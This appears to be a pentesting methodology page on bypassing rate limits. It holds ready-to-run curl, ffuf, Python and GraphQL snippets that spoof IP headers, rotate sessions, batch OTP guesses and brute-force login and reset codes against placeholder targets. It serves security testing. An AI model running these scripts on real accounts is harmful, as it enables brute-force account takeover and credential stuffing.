# Rate Limit Bypass

> **Summary**: Rate limiting restricts the number of requests a client can make in a given time window; bypass techniques exploit weak implementation to exceed these limits for brute-force, credential stuffing, or abuse attacks.
> **Impact**: Authentication brute-force, OTP bypass, enumeration of valid accounts, email bombing, API abuse.
> **Typical Severity**: Medium | High (enables chaining with authentication attacks)

## Detection

### Indicators

- HTTP 429 (Too Many Requests) responses after a threshold of requests
- Response headers revealing rate limit configuration:
  - `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`
  - `Retry-After`
- Consistent error messages like "Too many attempts, try again later"
- Identical responses regardless of input after a certain request count (soft block)
- Different response codes or body lengths when the correct value is sent even during a rate-limited state

### Automated Detection

Test for rate limiting presence:

```bash
# Send 100 rapid requests and observe response codes
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://<TARGET>/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong'$i'"}';
done | sort | uniq -c
```

Using ffuf:

```bash
ffuf -u https://<TARGET>/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"FUZZ"}' \
  -w <WORDLIST> -mc all -fc 429
```

Using Burp Suite Intruder or Turbo Intruder to measure when throttling kicks in.

### Manual Detection

1. Send repeated identical requests to a sensitive endpoint (login, password reset, OTP verification)
2. Note the exact request count before rate limiting activates
3. Record the response headers (`X-RateLimit-*`, `Retry-After`) to understand the window
4. Test whether the rate limit applies per IP, per session, per account, or per endpoint
5. Check if the rate limit resets on successful authentication or session change

## Exploitation

### Prerequisites

- A rate-limited endpoint (login, OTP, password reset, API action)
- Knowledge of the rate limit window and threshold (from detection phase)
- Depending on the technique: proxy list, multiple accounts, or Burp Suite

### Step-by-Step

#### 1. IP-Based Bypass via Header Spoofing

Many rate limiters trust proxy headers to identify the client IP. Rotate IP values in these headers:

```
X-Originating-IP: <SPOOFED_IP>
X-Forwarded-For: <SPOOFED_IP>
X-Remote-IP: <SPOOFED_IP>
X-Remote-Addr: <SPOOFED_IP>
X-Client-IP: <SPOOFED_IP>
X-Host: <SPOOFED_IP>
X-Forwarded-Host: <SPOOFED_IP>
X-Real-IP: <SPOOFED_IP>
```

Double header technique:

```
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

Rotate through different IPs on each request:

```bash
for i in $(seq 1 255); do
  curl -s -X POST https://<TARGET>/api/login \
    -H "X-Forwarded-For: 127.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com","password":"attempt'$i'"}';
done
```

**Success criteria**: requests continue to be processed (no 429) despite exceeding the normal threshold.

#### 2. Endpoint Variation Bypass

If rate limiting is bound to a specific URL path, try variations:

| Original | Bypass Variant |
|----------|---------------|
| `/api/login` | `/api/Login` |
| `/api/login` | `/api/LOGIN` |
| `/api/login` | `/api/login/` |
| `/api/login` | `/api/login/.` |
| `/api/login` | `/api/./login` |
| `/api/login` | `/api/login?param=1` |
| `/api/login` | `/api/login%20` |
| `/api/login` | `/api/login%00` |
| `/api/v1/login` | `/api/v2/login` or `/api/v3/login` |
| `/api/login` | `/Api/Login` |
| `/login` | `/sign-in` or `/signin` or `/SignUp` |

**Success criteria**: bypass variant is processed without triggering the rate limit counter.

#### 3. Parameter Manipulation Bypass

Alter the request parameters slightly so the rate limiter treats each request as unique:

- Add blank bytes to parameter values:
  ```
  code=1234%00
  code=1234%0a
  code=1234%0d
  code=1234%09
  code=1234%0d%0a
  code=1234%20
  ```
- Add non-significant parameters:
  ```
  POST /api/verify?cachebust=1
  POST /api/verify?cachebust=2
  ```
- Change parameter order:
  ```
  email=victim@target.com&password=test
  password=test&email=victim@target.com
  ```
- Unicode variations of the email:
  ```
  email=victim@target.com
  email=Victim@target.com
  email=victim@Target.com
  email=victim+tag@target.com
  ```

**Success criteria**: rate limit counter does not increment for the varied requests.

#### 4. HTTP Version and Method Bypass

- Switch from HTTP/1.1 to HTTP/2 (some rate limiters only track HTTP/1.1)
- Change request method: POST to PUT, PATCH, or GET
- Use HTTP/2 multiplexing to send many streams over a single connection:

```bash
# HTTP/2 multiplexed requests (100 in one connection)
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://<TARGET>/api/verify
```

**Success criteria**: requests bypass the per-connection or per-request counter.

#### 5. Session Rotation Bypass

If the rate limit is tracked per session:

1. Send requests up to the threshold
2. Obtain a new session (logout and re-login, or request a new session cookie)
3. Continue sending requests with the new session
4. Repeat

```python
import requests

url = "https://<TARGET>/api/verify"
for batch in range(100):
    session = requests.Session()
    session.post("https://<TARGET>/api/reset", data={"email": "victim@target.com"})
    for code in range(batch * 10, batch * 10 + 10):
        r = session.post(url, data={"code": f"{code:04d}"})
        if r.status_code == 200 and "success" in r.text:
            print(f"Valid code: {code:04d}")
            break
```

**Success criteria**: rate limit resets with each new session, allowing continued brute-force.

#### 6. GraphQL Alias Batching

Bundle multiple operations in a single GraphQL request using aliases:

```graphql
mutation bruteForceOTP {
    a: verifyOTP(code: "000000") { success }
    b: verifyOTP(code: "111111") { success }
    c: verifyOTP(code: "222222") { success }
    d: verifyOTP(code: "333333") { success }
    e: verifyOTP(code: "444444") { success }
}
```

Or use array-based batching:

```json
[
  {"query": "mutation { verifyOTP(code: \"000000\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"111111\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"222222\") { success } }"}
]
```

**Success criteria**: multiple verification attempts processed in a single HTTP request.

#### 7. Timing the Sliding Window

If the rate limit window is known (e.g., 60 seconds from `X-RateLimit-Reset`):

1. Send the maximum allowed requests just before the window resets
2. Wait for the window to reset
3. Immediately send another full burst

This doubles throughput without triggering the limiter:

```
|<-- window 1 -->|<-- window 2 -->|
          ######  ######
```

**Success criteria**: effective request rate exceeds the advertised limit.

#### 8. Distributed IP Rotation

Use proxy rotation or cloud-based IP cycling:

```bash
# Using fireprox (AWS API Gateway IP rotation)
python3 fire.py --command create --url https://<TARGET>/api/login
# Then direct Burp/ffuf traffic through the generated gateway URL
```

**Success criteria**: each request originates from a different IP, defeating per-IP rate limits.

### Proof of Concept

```bash
# Test X-Forwarded-For bypass
for i in $(seq 1 50); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://<TARGET>/api/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"email":"test@test.com","password":"wrong"}')
  echo "Request $i: $STATUS"
done
```

## Bypasses

| Rate Limit Type | Bypass Technique |
|-----------------|------------------|
| IP-based | X-Forwarded-For / X-Client-IP header rotation |
| IP-based (strict) | Proxy rotation, AWS API Gateway (fireprox) |
| Endpoint-based | URL case variation, path parameter injection, query string addition |
| Session-based | Session rotation (logout/re-login for new cookie) |
| Account-based | Distribute across multiple accounts |
| Request-count (single HTTP) | GraphQL alias batching, array-based batching |
| Connection-based | HTTP/2 multiplexing (many streams, one connection) |
| Fixed time window | Timing attack at window boundary (double burst) |
| Parameter-exact matching | Blank byte injection, Unicode variations, parameter reordering |
| User-Agent tracking | Rotate User-Agent header per request |
| Cookie-based | Clear cookies between requests, use different cookie jars |

## Escalation

- **Rate limit bypass + OTP brute-force**: bypass rate limiting on OTP verification to brute-force 4-6 digit codes -- see [2fa.md](../authentication/2fa.md)
- **Rate limit bypass + credential stuffing**: test large credential lists against login endpoints without throttling
- **Rate limit bypass + password reset brute-force**: enumerate valid reset tokens or codes -- see [reset-password.md](reset-password.md)
- **Rate limit bypass + race conditions**: combine with race condition attacks for double-spend or TOCTOU issues -- see [race-conditions.md](race-conditions.md)
- **GraphQL batching + authentication bypass**: bypass login rate limits using alias batching -- see [graphql.md](graphql.md)

## Tools

| Tool | Usage |
|------|-------|
| [Burp Suite Intruder](https://portswigger.net/burp) | Fuzz endpoints with payload lists while observing rate limit behavior |
| [Turbo Intruder](https://portswigger.net/bappstore/9abfe09175514b1a8a37044e3c7d051f) | High-performance attack engine with HTTP/2 support; tune `requestsPerConnection` |
| [ffuf](https://github.com/ffuf/ffuf) | Fast web fuzzer; use `-mc all -fc 429` to filter rate-limited responses |
| [fireprox](https://github.com/ustayready/fireprox) | AWS API Gateway IP rotation for defeating IP-based rate limits |
| [IPRotate (Burp Extension)](https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension) | Route Burp traffic through AWS API Gateway for per-request IP rotation |
| [hashtag-fuzz](https://github.com/Hashtag-AMIN/hashtag-fuzz) | Fuzzing tool with header randomization and proxy rotation |
| [Burp Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer) | Analyze randomness of tokens and rate limit reset windows |

## References

- https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-ip-block
- https://portswigger.net/research/turbo-intruder
- https://lab.wallarm.com/graphql-batching-attack/
- https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732
- https://github.com/ustayready/fireprox
- https://portswigger.net/research/graphql-authorization-bypass
